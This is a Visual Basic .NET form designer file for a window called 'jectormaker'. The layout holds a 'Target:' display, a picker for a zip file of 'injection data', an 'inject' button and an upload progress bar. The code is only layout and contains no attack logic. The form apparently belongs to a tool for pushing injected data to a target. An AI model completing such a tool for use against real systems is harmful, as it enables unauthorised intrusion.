<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class jectormaker
    Inherits basestyle


    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.targettitle = New System.Windows.Forms.Label()
        Me.targeticon = New System.Windows.Forms.PictureBox()
        Me.Panel3 = New System.Windows.Forms.Panel()
        Me.uploadprogress = New DrakeUI.Framework.DrakeUITrackBar()
        Me.DrakeWidth_W2asd = New DrakeUI.Framework.DrakeWidth_W()
        Me.closebtn = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.injctbtn = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.Panel4 = New System.Windows.Forms.Panel()
        Me.zippath = New DrakeUI.Framework.DrakeUITextBox()
        Me.DrakeWidth_W4ad = New DrakeUI.Framework.DrakeWidth_W()
        Me.DrakeUIButtonIcon2 = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.Panel5 = New System.Windows.Forms.Panel()
        Me.statelabel = New System.Windows.Forms.Label()
        Me.uploadworker = New System.ComponentModel.BackgroundWorker()
        CType(Me.myscr, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.myico, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel2.SuspendLayout()
        CType(Me.targeticon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel3.SuspendLayout()
        Me.Panel4.SuspendLayout()
        Me.Panel5.SuspendLayout()
        Me.SuspendLayout()
        '
        'pinbtn
        '
        Me.pinbtn.Location = New System.Drawing.Point(591, 5)
        '
        'minibtn
        '
        Me.minibtn.Location = New System.Drawing.Point(638, 5)
        '
        'closbtn
        '
        Me.closbtn.Location = New System.Drawing.Point(685, 5)
        '
        'mytitle
        '
        Me.mytitle.Size = New System.Drawing.Size(717, 18)
        '
        'Panel2
        '
        Me.Panel2.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel2.Controls.Add(Me.targettitle)
        Me.Panel2.Controls.Add(Me.targeticon)
        Me.Panel2.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel2.Location = New System.Drawing.Point(2, 71)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Padding = New System.Windows.Forms.Padding(5)
        Me.Panel2.Size = New System.Drawing.Size(727, 68)
        Me.Panel2.TabIndex = 40
        '
        'targettitle
        '
        Me.targettitle.Dock = System.Windows.Forms.DockStyle.Fill
        Me.targettitle.Font = New System.Drawing.Font("Cascadia Code", 10.0!, System.Drawing.FontStyle.Bold)
        Me.targettitle.ForeColor = System.Drawing.Color.Transparent
        Me.targettitle.Location = New System.Drawing.Point(69, 5)
        Me.targettitle.Name = "targettitle"
        Me.targettitle.Size = New System.Drawing.Size(653, 58)
        Me.targettitle.TabIndex = 43
        Me.targettitle.Text = "Target: "
        Me.targettitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'targeticon
        '
        Me.targeticon.Dock = System.Windows.Forms.DockStyle.Left
        Me.targeticon.Location = New System.Drawing.Point(5, 5)
        Me.targeticon.Name = "targeticon"
        Me.targeticon.Size = New System.Drawing.Size(64, 58)
        Me.targeticon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.targeticon.TabIndex = 0
        Me.targeticon.TabStop = False
        '
        'Panel3
        '
        Me.Panel3.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel3.Controls.Add(Me.uploadprogress)
        Me.Panel3.Controls.Add(Me.closebtn)
        Me.Panel3.Controls.Add(Me.DrakeWidth_W2asd)
        Me.Panel3.Controls.Add(Me.injctbtn)
        Me.Panel3.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.Panel3.Location = New System.Drawing.Point(2, 240)
        Me.Panel3.Name = "Panel3"
        Me.Panel3.Padding = New System.Windows.Forms.Padding(10)
        Me.Panel3.Size = New System.Drawing.Size(727, 49)
        Me.Panel3.TabIndex = 41
        '
        'uploadprogress
        '
        Me.uploadprogress.DisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.uploadprogress.Dock = System.Windows.Forms.DockStyle.Fill
        Me.uploadprogress.Enabled = False
        Me.uploadprogress.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.uploadprogress.Font = New System.Drawing.Font("Cascadia Code", 12.0!)
        Me.uploadprogress.ForeColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(136, Byte), Integer), CType(CType(229, Byte), Integer))
        Me.uploadprogress.Location = New System.Drawing.Point(10, 10)
        Me.uploadprogress.Name = "uploadprogress"
        Me.uploadprogress.ReadOnly = True
        Me.uploadprogress.RectColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.uploadprogress.Size = New System.Drawing.Size(443, 29)
        Me.uploadprogress.Style = DrakeUI.Framework.UIStyle.Custom
        Me.uploadprogress.TabIndex = 44
        Me.uploadprogress.Text = "DrakeUITrackBar4"
        '
        'DrakeWidth_W2asd
        '
        Me.DrakeWidth_W2asd.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeWidth_W2asd.Dock = System.Windows.Forms.DockStyle.Right
        Me.DrakeWidth_W2asd.Location = New System.Drawing.Point(565, 10)
        Me.DrakeWidth_W2asd.Name = "DrakeWidth_W2asd"
        Me.DrakeWidth_W2asd.Size = New System.Drawing.Size(40, 29)
        Me.DrakeWidth_W2asd.TabIndex = 54
        '
        'closebtn
        '
        Me.closebtn.Cursor = System.Windows.Forms.Cursors.Hand
        Me.closebtn.Dock = System.Windows.Forms.DockStyle.Right
        Me.closebtn.Enabled = False
        Me.closebtn.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.closebtn.ForeColor = System.Drawing.Color.Lime
        Me.closebtn.ForeHoverColor = System.Drawing.Color.Gray
        Me.closebtn.Location = New System.Drawing.Point(453, 10)
        Me.closebtn.Name = "closebtn"
        Me.closebtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.closebtn.RectColor = System.Drawing.Color.Lime
        Me.closebtn.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.closebtn.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.closebtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.closebtn.Size = New System.Drawing.Size(112, 29)
        Me.closebtn.Style = DrakeUI.Framework.UIStyle.Custom
        Me.closebtn.TabIndex = 55
        Me.closebtn.Text = "Close"
        Me.closebtn.Visible = False
        '
        'injctbtn
        '
        Me.injctbtn.Cursor = System.Windows.Forms.Cursors.Hand
        Me.injctbtn.Dock = System.Windows.Forms.DockStyle.Right
        Me.injctbtn.Enabled = False
        Me.injctbtn.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.injctbtn.ForeColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(136, Byte), Integer), CType(CType(229, Byte), Integer))
        Me.injctbtn.ForeHoverColor = System.Drawing.Color.Gray
        Me.injctbtn.Location = New System.Drawing.Point(605, 10)
        Me.injctbtn.Name = "injctbtn"
        Me.injctbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.injctbtn.RectColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(136, Byte), Integer), CType(CType(229, Byte), Integer))
        Me.injctbtn.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.injctbtn.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.injctbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.injctbtn.Size = New System.Drawing.Size(112, 29)
        Me.injctbtn.Style = DrakeUI.Framework.UIStyle.Custom
        Me.injctbtn.Symbol = 61671
        Me.injctbtn.TabIndex = 21
        Me.injctbtn.Text = "inject"
        '
        'Panel4
        '
        Me.Panel4.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel4.Controls.Add(Me.zippath)
        Me.Panel4.Controls.Add(Me.DrakeWidth_W4ad)
        Me.Panel4.Controls.Add(Me.DrakeUIButtonIcon2)
        Me.Panel4.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel4.Location = New System.Drawing.Point(2, 139)
        Me.Panel4.Name = "Panel4"
        Me.Panel4.Padding = New System.Windows.Forms.Padding(10)
        Me.Panel4.Size = New System.Drawing.Size(727, 45)
        Me.Panel4.TabIndex = 42
        '
        'zippath
        '
        Me.zippath.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.zippath.Dock = System.Windows.Forms.DockStyle.Fill
        Me.zippath.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.zippath.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.zippath.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.zippath.ForeColor = System.Drawing.Color.White
        Me.zippath.Location = New System.Drawing.Point(10, 10)
        Me.zippath.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
        Me.zippath.Maximum = 2147483647.0R
        Me.zippath.Minimum = -2147483648.0R
        Me.zippath.Name = "zippath"
        Me.zippath.Padding = New System.Windows.Forms.Padding(5)
        Me.zippath.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.zippath.RectColor = System.Drawing.Color.Gray
        Me.zippath.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.zippath.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.zippath.Size = New System.Drawing.Size(555, 25)
        Me.zippath.Style = DrakeUI.Framework.UIStyle.Custom
        Me.zippath.TabIndex = 22
        Me.zippath.TextAlignment = System.Drawing.ContentAlignment.TopCenter
        Me.zippath.Watermark = "Select (.zip) file contain injection data"
        '
        'DrakeWidth_W4ad
        '
        Me.DrakeWidth_W4ad.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeWidth_W4ad.Dock = System.Windows.Forms.DockStyle.Right
        Me.DrakeWidth_W4ad.Location = New System.Drawing.Point(565, 10)
        Me.DrakeWidth_W4ad.Name = "DrakeWidth_W4ad"
        Me.DrakeWidth_W4ad.Size = New System.Drawing.Size(40, 25)
        Me.DrakeWidth_W4ad.TabIndex = 53
        '
        'DrakeUIButtonIcon2
        '
        Me.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand
        Me.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Right
        Me.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.DrakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon2.Location = New System.Drawing.Point(605, 10)
        Me.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2"
        Me.DrakeUIButtonIcon2.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.White
        Me.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon2.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.DrakeUIButtonIcon2.Size = New System.Drawing.Size(112, 25)
        Me.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom
        Me.DrakeUIButtonIcon2.Symbol = 57437
        Me.DrakeUIButtonIcon2.TabIndex = 21
        Me.DrakeUIButtonIcon2.Text = "Data"
        '
        'Panel5
        '
        Me.Panel5.Controls.Add(Me.statelabel)
        Me.Panel5.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel5.Location = New System.Drawing.Point(2, 184)
        Me.Panel5.Name = "Panel5"
        Me.Panel5.Size = New System.Drawing.Size(727, 56)
        Me.Panel5.TabIndex = 43
        '
        'statelabel
        '
        Me.statelabel.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.statelabel.Dock = System.Windows.Forms.DockStyle.Fill
        Me.statelabel.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.statelabel.ForeColor = System.Drawing.Color.Transparent
        Me.statelabel.Location = New System.Drawing.Point(0, 0)
        Me.statelabel.Name = "statelabel"
        Me.statelabel.Padding = New System.Windows.Forms.Padding(5)
        Me.statelabel.Size = New System.Drawing.Size(727, 56)
        Me.statelabel.TabIndex = 44
        Me.statelabel.Text = "State: Waiting...."
        Me.statelabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'uploadworker
        '
        '
        'jectormaker
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(731, 291)
        Me.Controls.Add(Me.Panel5)
        Me.Controls.Add(Me.Panel4)
        Me.Controls.Add(Me.Panel3)
        Me.Controls.Add(Me.Panel2)
        Me.Name = "jectormaker"
        Me.Text = "jectormaker"
        Me.Controls.SetChildIndex(Me.Panel2, 0)
        Me.Controls.SetChildIndex(Me.Panel3, 0)
        Me.Controls.SetChildIndex(Me.Panel4, 0)
        Me.Controls.SetChildIndex(Me.Panel5, 0)
        CType(Me.myscr, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.myico, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel2.ResumeLayout(False)
        CType(Me.targeticon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel3.ResumeLayout(False)
        Me.Panel4.ResumeLayout(False)
        Me.Panel5.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents Panel2 As Panel
    Friend WithEvents targeticon As PictureBox
    Friend WithEvents targettitle As Label
    Friend WithEvents Panel3 As Panel
    Friend WithEvents injctbtn As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents Panel4 As Panel
    Friend WithEvents DrakeUIButtonIcon2 As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents zippath As DrakeUI.Framework.DrakeUITextBox
    Friend WithEvents DrakeWidth_W4ad As DrakeUI.Framework.DrakeWidth_W
    Friend WithEvents Panel5 As Panel
    Friend WithEvents uploadprogress As DrakeUI.Framework.DrakeUITrackBar
    Friend WithEvents DrakeWidth_W2asd As DrakeUI.Framework.DrakeWidth_W
    Friend WithEvents statelabel As Label
    Friend WithEvents uploadworker As System.ComponentModel.BackgroundWorker
    Friend WithEvents closebtn As DrakeUI.Framework.DrakeUIButtonIcon
End Class
